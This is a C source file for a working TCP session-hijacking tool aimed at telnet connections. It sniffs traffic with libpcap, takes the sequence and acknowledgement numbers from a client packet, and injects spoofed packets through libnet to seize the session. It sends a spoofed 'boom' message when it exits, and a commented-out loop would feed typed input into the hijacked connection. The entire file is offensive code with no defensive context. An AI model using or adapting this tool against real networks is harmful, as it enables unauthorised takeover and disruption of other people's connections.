/**
 * hijack_telnet.c
 */

#include "sniffer.h"
#include "netlog.h"
#include "netlib.h"

#include <stdio.h>
#include <stdlib.h>

#include <signal.h>
#include <string.h>
#include <pcap.h>
#include <stdbool.h>

#define INFO_BUF_SIZE 256
#define INFO_BUFFER 128

#define RUDE_MESSAGE_LENGTH 1024
#define MAX_FUCKS_GIVEN 10

pcap_t* handler;
libnet_t* netcons;
int counter = 0;


u_long srcip;
u_long dstip;
uint16_t srcport;
uint16_t dstport;

uint32_t global_seq;
uint32_t global_ack;

bool hijacked;

void leaveserver(int sig) {
    if (hijacked) {
		// Disconnect by sending BOOM!!!!! /r/n
		char rudemsg[] = "\r\nboom\r\n";
		send_rude_tcp(
			netcons,
			srcip,
			dstip,
			srcport,
			dstport,
			TCP_PUSH | TCP_ACK,
			global_seq,
			global_ack,
			rudemsg,
			strlen(rudemsg)
		);	
	
	}
	

	pcap_close(handler);
    libnet_destroy(netcons);
    exit(0);
}


void send_malicious_message(uint32_t seq, uint32_t ack) {

	printf("Sending Malicious Message...\n");	
	uint32_t current_seq = seq;
	uint32_t current_ack = ack;

	char rudebuffer[8192];
	int message_size = RUDE_MESSAGE_LENGTH;
	memset(&rudebuffer, 0, sizeof(rudebuffer));
	
	/* libnet handle, srcip, dstip, srcprt, dstprt, 
	 * flags, seq, ack, data, datalength */
	send_rude_tcp(
		netcons,
		srcip, 
		dstip,
		srcport,
		dstport,
		TCP_PUSH | TCP_ACK,
		current_seq,
		current_ack,				
		rudebuffer,
		RUDE_MESSAGE_LENGTH
	);
	current_seq += RUDE_MESSAGE_LENGTH;
	hijacked = true;	
	
	global_seq = current_seq;
	global_ack = current_ack;

	/*
	printf("H I J A C K E D B O Y E S\n");
	printf("-------------------------\n");

	while(fgets(rudebuffer, sizeof(rudebuffer)-1, stdin)) {
		send_rude_tcp(
			netcons,
			srcip,
			dstip,
			srcport,
			dstport,
			TCP_PUSH | TCP_ACK,
			current_seq,
			current_ack,
			rudebuffer,
			strlen(rudebuffer)
		);
		current_seq += strlen(rudebuffer);
		global_seq = current_seq;
		memset(&rudebuffer, 0, sizeof(rudebuffer));
	}
	printf("Goodbye!\n");
	*/

	// Block, waiting for SIGINT and SIGQUIT
	for(;;) {

	}
	exit(0);
}


	

void parse_pkt(struct pcap_pkthdr* header, const u_char* data) {

	log_everything(header, data); 

	/* ignore everything but TCP */
	/* we want a packet that goes from User->Host */
	/* we also want ACKs not SYNs or anything else */
	struct tcp_hdr* tcpheader;
	struct ip_hdr* ipheader;

	ipheader = (struct ip_hdr*) (data + ETHER_HDR_LEN);
	tcpheader = (struct tcp_hdr*) (data + ETHER_HDR_LEN + 20);
		
	if (!(tcpheader->tcp_flags & TCP_ACK)) return;

	srcip = *((u_long*) &(ipheader->ip_src_addr));
	dstip = *((u_long*) &(ipheader->ip_dst_addr));
	srcport = ntohs(tcpheader->tcp_src_port);
	dstport = ntohs(tcpheader->tcp_dst_port);

	uint32_t scraped_seq = ntohl(tcpheader->tcp_seq);
	uint32_t scraped_ack = ntohl(tcpheader->tcp_ack);

	send_malicious_message(scraped_seq, scraped_ack);
}



void main_loop(pcap_t* pd) {
    struct pcap_pkthdr *pktHeader;
    const u_char *pktData;
    int status;
    status = pcap_next_ex(pd, &pktHeader, &pktData);

    switch (status) {
        case 1:
            parse_pkt(pktHeader, pktData);
            main_loop(pd);
            break;
        case 0:
            main_loop(pd);
            break;
        case -1:
            printf("libpcap error in mainloop() - exiting...\n");
            exit(1);
            break;
        case -2:
            printf("Breakloop called - exiting...\n");
            exit(0);
            break;
        default:
            printf("Recieved unrecognized status in mainloop()...\n");
            exit(1);
            break;
    }
    return;
}




int main (int argc, char** argv) {
	if (argc < 3 || argc > 4) {
		printf("Usage: \n");
		printf("hijack_telnet server_name server_port [dev_name]\n");
		return 1;
	}
	char server[INFO_BUFFER];
	char device[INFO_BUFFER];
	memset(device, 0, INFO_BUFFER);
	memset(server, 0, INFO_BUFFER);
	
	strcpy(server, argv[1]);
	int port = atoi(argv[2]);
	
	if (argc == 4) {
		strcpy(device, argv[3]);
	}

	char filterbuf[INFO_BUFFER];
	
	sprintf(
		filterbuf,
		"tcp port %d and dst host %s and dst port %d",
		port,
		server,
		port
	);

	hijacked = false;
		
	if ((handler = open_pcap_socket_filtered(device, filterbuf))) {
		if ((netcons = open_libnet_handler(device))) {
			
			struct sigaction s;
			memset(&s, 0, sizeof(s));
			s.sa_handler = leaveserver;
			sigaction(SIGTERM, &s, NULL);
			sigaction(SIGINT, &s, NULL);
			sigaction(SIGQUIT, &s, NULL);
			
			main_loop(handler);
			leaveserver(0);	
		} else {
			printf("Libnet could not be allocated...\n");
			return 1;
		}
	} else {
		printf("Handler could not be allocated...\n");
		return 1;
	}

	return 0;
}

